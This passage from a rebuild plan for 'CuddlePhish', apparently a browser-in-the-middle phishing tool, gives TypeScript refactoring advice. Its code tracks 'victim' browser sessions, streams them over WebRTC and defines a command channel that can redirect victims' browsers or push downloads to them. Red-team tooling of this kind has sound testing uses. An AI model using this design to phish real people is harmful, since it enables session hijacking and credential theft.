### ❌ DON'T: Extending Browser Objects with Custom Properties

**Legacy Pattern:**
```typescript
// BAD - Mutating browser object
browser.socket_id = ''
browser.victim_socket = ''
browser.victim_width = 0
browser.controller_socket = ''
browser.remove_instance = async function() { /* ... */ }
```

**Why it's bad:**
- No type safety
- Property conflicts possible
- Hard to track what properties exist
- Not maintainable

**✅ DO: Use Proper Class Wrappers**

```typescript
// GOOD - Type-safe wrapper class
interface BrowserInstanceData {
  id: string;
  socketId: string;
  victimSocketId: string;
  victimWidth: number;
  victimHeight: number;
  controllerSocketId?: string;
  status: BrowserStatus;
}

class BrowserInstance {
  private data: BrowserInstanceData;
  private puppeteerBrowser: Browser;
  private targetPage: Page;
  private broadcastPage: Page;
  private xvfb: XvfbInstance;
  
  constructor(
    puppeteerBrowser: Browser,
    targetPage: Page,
    broadcastPage: Page,
    xvfb: XvfbInstance,
    data: BrowserInstanceData
  ) {
    this.puppeteerBrowser = puppeteerBrowser;
    this.targetPage = targetPage;
    this.broadcastPage = broadcastPage;
    this.xvfb = xvfb;
    this.data = data;
  }
  
  get id(): string { return this.data.id; }
  get socketId(): string { return this.data.socketId; }
  set socketId(id: string) { this.data.socketId = id; }
  
  async remove(): Promise<void> {
    await this.xvfb.stop();
    await this.puppeteerBrowser.close();
  }
}
```

### ❌ DON'T: Inline HTML with Inline Scripts

**Legacy Pattern:**
```html
<!-- BAD - Everything in one HTML file -->
<!DOCTYPE html>
<html>
<body>
  <video></video>
  <script>
    // Hundreds of lines of inline JavaScript
    const socket = io.connect(...)
    // ...
  </script>
</body>
</html>
```

**Why it's bad:**
- No code splitting
- No tree-shaking
- Hard to maintain
- No type checking
- No modern tooling benefits

**✅ DO: Component-Based Architecture**

```typescript
// Modern React/Vue component structure
// src/client/victim/src/App.tsx
import { VideoStream } from './components/VideoStream';
import { useWebRTC } from './hooks/useWebRTC';
import { useSocket } from './hooks/useSocket';

export const VictimApp = ({ clientIp, targetId }: Props) => {
  const socket = useSocket();
  const { peerConnection, videoRef } = useWebRTC(socket);
  
  return (
    <div>
      <video ref={videoRef} autoPlay playsInline muted />
    </div>
  );
};

// Build produces optimized, split bundles
```

### ❌ DON'T: eval() for Dynamic Script Execution

**Legacy Pattern:**
```typescript
// BAD - eval() on client side
socket.on("execute_script", function(script){
  eval(script)
})
```

**Why it's bad:**
- Security risk (code injection)
- No type safety
- Hard to debug
- Bad practice

**✅ DO: Structured Event System**

```typescript
// GOOD - Type-safe event system
type ServerCommand = 
  | { type: 'redirect'; url: string }
  | { type: 'download'; data: Blob; filename: string }
  | { type: 'show_message'; message: string };

socket.on('server_command', (command: ServerCommand) => {
  switch (command.type) {
    case 'redirect':
      window.location.href = command.url;
      break;
    case 'download':
      const blob = new Blob([command.data]);
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = command.filename;
      a.click();
      break;
    case 'show_message':
      // Show toast notification
      break;
  }
});
```

### ❌ DON'T: Manual Array Filtering for Object Lookups

**Legacy Pattern:**
```typescript
// BAD - Linear search through array
var browsers = []
browsers.get = function(attr, val){
  return this.filter(x => x[attr] === val)[0]
}
const browser = browsers.get('browser_id', browser_id)
```

**Why it's bad:**
- O(n) lookup time
- Inefficient
- No type safety

**✅ DO: Use Maps for O(1) Lookups**

```typescript
// GOOD - Map-based lookup
class BrowserPoolManager {
  private browsers: Map<string, BrowserInstance> = new Map();
  
  getBrowser(id: string): BrowserInstance | undefined {
    return this.browsers.get(id);
  }
  
  addBrowser(browser: BrowserInstance): void {
    this.browsers.set(browser.id, browser);
  }
  
  removeBrowser(id: string): boolean {
    return this.browsers.delete(id);
  }
}
```

### ❌ DON'T: String-Based Configuration Replacement

**Legacy Pattern:**
```typescript
// BAD - String replacement in HTML
reply.type('text/html').send(stream.pipe(replace(/SOCKET_KEY/, config.socket_key)))
```

**✅ DO: Environment Variables or Build-Time Injection**

```typescript
// Build-time (Vite example)
// vite.config.ts
export default {
  define: {
    __SOCKET_KEY__: JSON.stringify(process.env.SOCKET_KEY),
  },
};

// Runtime - Pass via props/state
const AdminApp = () => {
  const socket = useSocket({ key: process.env.SOCKET_KEY });
  // ...
};
```

### ❌ DON'T: Manual Viewport Window Resizing with Private APIs

**Legacy Pattern:**
```typescript
// BAD - Direct CDP calls for window management
const {windowId} = await browser._connection.send('Browser.getWindowForTarget', {...})
await browser._connection.send('Browser.setWindowBounds', {...})
```

**✅ DO: Use Public Viewport APIs**

```typescript
// GOOD - Public Puppeteer viewport API
async function resizeBrowser(page: Page, width: number, height: number): Promise<void> {
  await page.setViewport({ width, height });
  
  // If window resizing is needed, use CDP session explicitly (only if necessary)
  const client = await page.target().createCDPSession();
  try {
    const { windowId } = await client.send('Browser.getWindowForTarget', {
      targetId: page.target()._targetId,
    });
    await client.send('Browser.setWindowBounds', {
      windowId,
      bounds: { width, height },
    });
  } finally {
    await client.detach();
  }
}
```

### Key Principles for Modern Rebuild

1. **Use Public APIs Only**: Never access private properties (those starting with `_`)
2. **Type Safety First**: Use TypeScript strictly, avoid `any` types
3. **Component-Based Frontend**: React/Vue components, not inline HTML/JS
4. **Framework Conventions**: Use framework middleware, don't reinvent
5. **Proper Data Structures**: Maps/Sets for lookups, not arrays
6. **Build-Time Optimization**: Let build tools handle templating/bundling
7. **Structured Events**: Type-safe event system, not `eval()` or string execution
8. **Proper Resource Management**: Classes and proper lifecycle, not object mutation

### Migration Checklist

When implementing, ensure you:
- [ ] Never use `_client`, `_connection`, or other private Puppeteer properties
- [ ] Use public Puppeteer APIs or explicit CDP sessions with try/finally
- [ ] Build frontend with modern bundler (Vite/Webpack), not inline scripts
- [ ] Use framework static file serving, not manual routes
- [ ] Wrap browser instances in proper classes, don't mutate objects
- [ ] Use Maps for O(1) lookups, not array filters
- [ ] Replace templates at build-time or with proper templating engine
- [ ] Use structured events, never `eval()` or dynamic script execution
- [ ] Type everything with TypeScript strict mode

---

## Conclusion

This modern rebuild plan transforms CuddlePhish from a monolithic script into a production-ready, scalable application. Key benefits include:

1. **Maintainability**: TypeScript, modular architecture, comprehensive tests
2. **Scalability**: Redis, database persistence, horizontal scaling support
3. **Reliability**: Better error handling, health checks, monitoring
4. **Developer Experience**: Modern tooling, hot reload, clear documentation
5. **Security**: Proper authentication, input validation, secrets management
6. **User Experience**: Modern admin UI, better performance, responsive design

The phased approach allows for incremental development and testing, reducing risk and enabling early feedback. Each phase builds upon the previous, creating a solid foundation for a robust tool.

---

## Appendix: Alternative Technologies Considered

### Playwright vs Puppeteer
- **Playwright**: Better cross-browser support, more modern API, better documentation
- **Puppeteer**: More mature, better stealth plugin ecosystem
- **Decision**: Stick with Puppeteer for now, consider Playwright migration later

### Fastify vs Express
- **Fastify**: Faster, better TypeScript support, more modern
- **Express**: More mature, larger ecosystem, more examples
- **Decision**: Fastify for performance benefits

### React vs Vue
- **React**: Larger ecosystem, more developers familiar
- **Vue**: Easier learning curve, better performance for small apps
- **Decision**: React for ecosystem and team familiarity

### SQLite vs PostgreSQL
- **SQLite**: Simpler, no separate server, good for single-instance
- **PostgreSQL**: Better for production, supports concurrent connections, better for scaling
- **Decision**: Support both, SQLite for dev, PostgreSQL for production

